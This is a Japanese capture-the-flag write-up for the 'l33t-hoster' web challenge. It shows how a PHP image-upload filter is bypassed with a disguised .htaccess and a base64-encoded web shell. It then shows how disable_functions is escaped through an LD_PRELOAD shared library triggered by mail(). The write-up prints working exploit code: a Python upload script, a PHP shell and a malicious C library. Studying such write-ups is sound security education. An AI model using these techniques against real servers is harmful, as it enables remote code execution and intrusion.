# l33t-hoster [web]

## 問題の概要
* 問題文 You can host your l33t pictures [here](http://35.246.234.136/)

hereのリンクで移動すると(現在は移動できない)、画像を投稿が出来るサイトへ行くことになる。

## 問題サイトを調べてみる
ファイルを選択するボタンと送信するボタンがあるので適当なファイルを選んで送信してみる
![問題サイトの画像](https://github.com/takashimakazuki/study/blob/image/image_1.png "問題")

## ソースコードを見たい
問題サイトのhtmlを見てみると、フォームのhtmlが書かれているだけで特に変わったことは書かれていない。
と、思いきや最後の行の<!-- /?source -->は手がかりになっていて、getパラメータのsourceがセットされているとソースコードが手に入ることを表しているらしい。

```html
<h1>Upload your pics!</h1>
<form method="POST" action="?" enctype="multipart/form-data">
    <input type="file" name="image">
    <input type="submit" name=upload>
</form>
<!-- /?source -->
```
urlに?source=aaaaaや、?sourceなどを加えてみると、たしかにソースコードが得られた。

## ソースコード（コメントを各所に追加）
```php
// index.php
<?php
// ここのコードによってGETパラメータにsourceと入れるとファイルの内容が見られる。
if (isset($_GET["source"]))
    die(highlight_file(__FILE__));

session_start();

// 新しいセッションの場合にはユーザがアップロードする画像を保存するためのディレクトリを作ってくれる。
// ユーザ用のディレクトリの例：　images/4f6c8e238dfc6a82d0bd2642a6b6593c52b0cea4/
if (!isset($_SESSION["home"])) {
    $_SESSION["home"] = bin2hex(random_bytes(20));
}
$userdir = "images/{$_SESSION["home"]}/";
if (!file_exists($userdir)) {
    mkdir($userdir);
}

$disallowed_ext = array(
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "pht",
    "phtm",
    "phtml",
    "phar",
    "phps",
);


if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    // ①ファイルの名前がないと弾かれる。
    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    // ②送信したファイルの拡張子が.phpとかだと弾かれる。
    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    // ③ファイル内に"<?"の文字があると弾かれる。
    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    // ④画像ファイル以外は弾かれる。
    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    // ⑤画像サイズが1337×1337でないと弾かれる。
    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    // 送信したファイルが保存される。おめでとう！！
    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}

echo "<h3>Your <a href=$userdir>files</a>:</h3><ul>";
foreach(glob($userdir . "*") as $file) {
    echo "<li><a href='$file'>$file</a></li>";
}
echo "</ul>";

?>

<h1>Upload your pics!</h1>
<form method="POST" action="?" enctype="multipart/form-data">
    <input type="file" name="image">
    <input type="submit" name=upload>
</form>
<!-- /?source -->
```
if文が書かれており、条件に引っかかってしまうと`die()`でメッセージを残してプログラムが終了してしまう。
送信したファイルがサーバに保存されるためにはif文を抜けたあとに書かれている

```
move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
```

これが実行されなければいけない。

このコードにたどり着くためにファイルが満たすべき条件をまとめる
> 1. ファイルには名前が必要(`.abcd`のような名前のファイルは保存されない)
> 2. PHP拡張子はだめ（`.php`, `.php3`, `pht`）
> 3. ファイルの中に`<?`が含まれてはいけない
> 4. 画像ファイルである
> 5. 画像のサイズが1337×1337である

## 目標
 * おそらくサーバの中のどこかにflagが隠されているので、サーバでphpのスクリプトを実行して内部をのぞく。
 * 上の1~5の要件をすべて満たし、サーバ内に保存されるようなファイルを作る。
 * php拡張子と<?を用いずにphpを実行できるようにする。

`.htaccess`ファイルを送信してサーバの設定を書き変えることでなんとかphpを実行できないか？

## 解法

#### ①.htaccessという名前ではファイルが保存されない

```
$parts = explode(".", $name);
$ext = array_pop($parts);

if (empty($parts[0])) {
    //配列の0番要素が削除され、他の要素が前へシフトする。
    array_shift($parts);
}

// ①ファイルの名前がないと弾かれる。
if (count($parts) === 0) {
    die("lol filename is empty");
}

~~if文を抜けた後~~
$name = implode(".", $parts);
move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
```

.htaccessという名前で保存してもらいたいわけだが、上の部分のコードによりこの名前では保存してもらえない。
しかし、配列のシフトが一回しか行われていないので例えば`..htaccess`という名前にすれば上記コードの最終行の`$name`は.htaccessになる。


#### ②&⑤ phpに画像として認識してもらう
アップロードされたファイルが画像かどうか調べている関数は、`exif_imagetype()`であるので、これが何をしているのかphp公式マニュアルから調べてみる。

> exif_imagetype() reads the first bytes of an image and checks its signature.

画像ファイルは、ファイルの種類を特定するために最初の数バイトに決まった数字が入っている。この関数では最初の数バイトを調べてその画像ファイル
の種類やサイズなどの情報を読んでいる。つまり、はじめの数バイトを書き換えていれば画像ファイルとして偽装し、
この関数を騙すことが出来る。`exif_imagetype`が識別できる画像ファイルの種類は[php公式ドキュメント](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants)から確認できる。

ここでは.htaccessファイルを`.wbmp`ファイル（画像ファイル）にみせかける。理由は以下。

* wbmpファイルのヘッダーは `0000`から始まりその後の数バイト(可変)は画像サイズを表している。
* .htaccess内では`\x00`で始まるラインはコメントアウトされる。(#でもコメントアウトされる)

つまり、この問題の場合、
```
0000 8a39 8a39 0a...
```
というバイトから始めていれば、phpにはwbmpファイルだと判断され、サーバ内で設定ファイルとして働くときにはエラーを起こさずに動いてくれる！(0aは改行コード)

なるほど、おそらく`8a39`という16進数が画像の幅と高さを表してるのだろう、とwriteupを読みながら思っていたがよくよく考えてみると16進数の8a39は明らかに10進数の1337ではない。参考にしたwriteupの説明にはなかったので`wbmp`について少し調べてみた。

#### wbmp画像について
> wikipedia
>* Wireless Application Protocol Bitmap Format（Wireless Bitmap と略記される）
>* WBMP 画像はモノクロ（黒と白）であり、ファイルサイズは小さい。黒いピクセルを 0、白いピクセルを 1 で表す。
>
> [イマサラですが、WBMPのフォーマットって？](http://blog.bylo.jp/develop/2014/12/1854/)

* 画像サイズを表すバイト長が可変長である。そのため幅と高さの1337の表し方は下の図のようになる。

![図](https://github.com/takashimakazuki/study/blob/image/wbmp_image.png "説明図")


#### ③.php拡張子はつけずにphpファイルとして実行させる

htaccessファイルとはapacheサーバで使われる設定ファイル。リダイレクト、アクセス制限、MIMEタイプの設定などの設定の変更、
追加がディレクトリ単位で出来る。

ここでは`MIMEタイプ`設定で`.wani`拡張子(何でも良い)をphpファイルだと認識させる。
そのため、htaccessファイルにに次の一行を加える。


```
// .htaccess
AddType application/x-httpd-php .wani
```

これで`.wani`ファイルはphpとして実行される。

[htaccessに3行足すだけ！『.html』内でPHPを実行する方法！](https://xn--web-oi9du9bc8tgu2a.com/how-to-use-php-in-html-files/)

#### ④ <? を書かずにphpを実行させる

実行させたいこーど

```php
// shell.wani
<?php
  system(ls -lah /);
?>
```

phpを書く際には必ず`<?php  ?>`で囲まれた中にコードを書かなければいけないが、この問題では`<?`の文字が入った
ファイルはサーバ内に保存してもらえない。

これを回避するためにphpのスクリプトをbase64などでエンコードしてしまう。もちろんこのままでは実行されない。
.htaccessに設定を書き加えて、デコードしてから実行されるようにする。

```
// .htaccess
php_value auto_append_file "php://filter/convert.base64-encode/resource=shell.wani"
```

`auto_append_value`は引数に取ったものをメインのプログラムが実行された後に実行する。
ここでは`"php://filter/convert.base64-encode/resource=shell.wani"`が引数なので
shell.waniをbase64デコードしたものが実行される。

[auto_append_file ディレクティブで自動的にファイルを読み込む](https://linuxserver.jp/%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0/php/auto_prepend_file%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%86%E3%82%A3%E3%83%96%E3%81%A8auto_append_file%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%86%E3%82%A3%E3%83%96/)

### 解答コード1

pythonのコードでまとめる

```python
import requests
import base64

VALID_WBMP = b'\x00\x00\x8a\x39\x8a\x39\x0a'
URL = 'http://127.0.0.1:8000'
RANDOM_DIRECTORY = '674556e943cbe2a967e63bb05743abb2d49e4640'

COOKIES = {
    "PHPSESSID" : "803e85ab9d0122057a6bbf96f5b93c48"
}

def upload_content(name, content):

    data = {
        "image" : (name, content, 'image/png'),
        "upload" : (None, "Submit Query", None)
    }

    response = requests.post(URL, files=data, cookies=COOKIES)

HT_ACCESS = VALID_WBMP + b"""
AddType application/x-httpd-php .wani
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.wani"
"""

TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"""
<?php
  system("ls -lah /");
?>
""")

upload_content("..htaccess", HT_ACCESS)
upload_content("shell.wani", TARGET_FILE)
upload_content("trigger.wani", VALID_WBMP)


response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.wani")
print(response.text)

```
3つのファイルを送信してtrigger.waniにアクセスするとtrigger.waniがphpとして実行された後、shell.waniが実行される。

これでrootディレクトリを見ることが出来る。と思いきやこれではまだ終わらない。
phpの`system`関数が使えない設定になっているため、シェル実行は別の方法を考えなくてはならない。

> 参考にしたwriteupの一部
>
>With the python script above, we can run arbitrary PHP code. We tried runnning typical shell functions such as system() and exec(), but soon realized that most of these functions are blocked.


## コマンドを実行させる

* `LD_PRELOAD`インジェクションを行う。

`phpinfo()`を実行してみると使用できない関数がわかる。その中にmail関数とputenv関数が含まれていないので`mail`を使って任意のコマンドを実行させる手法を使う。


>LD_PRELOADインジェクションとは
>
> 実行するプログラムが参照する共有ライブラリを自作したライブラリへ変更して、自作したライブラリ内の関数が実行されるようにすること。

#### LD_PRELOAD 例 random_num.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(){
  srand(time(NULL));
  printf("%d\n",rand()%100);
  return 0;
}
```

`gcc random_num.c -o random_num`でコンパイルして、
このコードを実行すると、ランダムな数字が表示される。
このファイルはこれ以上書き換えたり、再びコンパイルはしない。

ここで自作の共有ライブラリ(unrandom.so)を作る

```c
int rand() {
  return 9999;
}
```

共有ライブラリにしたいので`gcc -shared -fPIC unrandom.c -o unrandom.so`でコンパイルする。
そして環境変数に`LD_PRELOAD="path/to/unrandom.so"`を追加する。これでrandom_numのプログラム中のrand関数は
先程作ったunrandom.soを見に行くので、もう一度random_numを実行すると結果は下のようになる。
```
9999
```
実際のrand()は実行されずに自作したrand()が実行される。つまり実行ファイルは変更せずに動作を変えることが出来る。

動的リンクを行っている実行ファイルでこのようなことが出来る。詳しい解説は以下の記事で説明されています。

[Dynamic linker tricks](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)

問題ではmailの中で`execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "], ...)`
というシステムコールが呼ばれている。このような実装がされているので`/bin/sh`の動作を変えることが出来る。(どういうこと？)

#### shell.waniの内容を変更
```php
<?php
move_uploaded_file($_FILES['evil']['tmp_name'], '/tmp/evil.so');
putenv('LD_PRELOAD=/tmp/evil.so');
putenv("_evilcmd=ls -lah /");
mail('a','a','a');
echo file_get_contents('/tmp/_0utput.txt');
?>
```
#### カスタムしたsoファイル
```c
cat evil.c
/* compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(char *cmd) {
 char buf[512];
 strcpy(buf, cmd);
 strcat(buf, " > /tmp/_0utput.txt");
 system(buf);
}

// mailでこのgetuid()が呼ばれているからこの関数を書き換えている？
int getuid() {
 char *cmd;
 if (getenv("LD_PRELOAD") == NULL) { return 0; }
 unsetenv("LD_PRELOAD");
 if ((cmd = getenv("_evilcmd")) != NULL) {
   payload(cmd);
 }
 return 1;
}
```

これでようやく`system("ls -lah /")`ができる。実行結果は下のようになっている。flagとget_flagがあるので
ルートディレクトリに移動し、get_flagを実行するとflagが手に入りそう。
```
// ls -lah /

total 104K
drwxr-xr-x   1 root root 4.0K Jan 20 08:25 .
drwxr-xr-x   1 root root 4.0K Jan 20 08:25 ..
drwxr-xr-x   1 root root 4.0K Jan  9 15:45 bin
drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
drwxr-xr-x   5 root root  360 Jan 20 08:25 dev
drwxr-xr-x   1 root root 4.0K Jan 20 08:25 etc
-r--------   1 root root   38 Jan 10 15:10 flag
-rwsr-xr-x   1 root root  17K Jan 10 15:10 get_flag
...
...
```

## captcha
まだまだ問題は終わらない。get_flagを実行するとcapchaがでてきて入力を待っている。
```
// /get_flag

Please solve this little captcha:
2887032228 + 1469594144 + 3578950936 + 3003925186 + 985175264
11924677758 != 0 :(
```

足し算の結果が問われているので自動で解答を出すプログラムを書く必要がある。これを解くとようやくflagが手に入る。

最終的にshell.waniに書く内容は下のようになる
```php
<?php

// Upload the solver and shared library
move_uploaded_file($_FILES['captcha_solver']['tmp_name'], '/tmp/captcha_solver');
move_uploaded_file($_FILES['evil']['tmp_name'], '/tmp/evil_lib');

// Set the captcha_solver as executable
putenv('LD_PRELOAD=/tmp/evil_lib');
putenv("_evilcmd=chmod +x /tmp/captcha_solver");
mail('a','a','a');

// Run the captcha solver
putenv("_evilcmd=cd / && /tmp/captcha_solver");
mail('a','a','a');

// Print output
echo file_get_contents('/tmp/_0utput.txt');
?>
```

## 疑問
* Dockerで動かしているapacheのphp設定はどこに書けばよいのか？
> phpの設定は普通php.iniに書く
* base64エンコードがphp部分にだけ行われているがこれで良いのか？
> phpのパーサは<?php ?>で囲まれた部分のみを評価するのでOK
* 送信したファイルがphpとして実行されるとき、先頭の数バイトに書かれている文字はエラーにならないのか？
> 上と同様の理由でOK
* 解答コードに含まれている`AA`の文字は何か？
> base64のデコードがうまく行くようにバイトの数を調節している。詳しくは下へ
* なぜmail関数を使うのか、他の関数ではだめなのか？
> 他の関数でも良い。上書きすべきCの関数が分かっていれば。

### Base64
base64とはその名の通り64の文字を使うエンコードの方法。エンコード方法は特に複雑ではない。
wikipediaの図がとてもわかり易い。

https://en.wikipedia.org/wiki/Base64

#### step1
エンコードしたい01を6bitずつ分ける。足りない場合は0を埋める

#### step2
6bitに分けたものを2進法の数字として読む。

#### step3
数字から文字への変換表があるのでそれぞれ文字になおす。

#### step4
変換した文字を順に並べる。

#### 終了!

## 参考にしたwriteup
https://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster
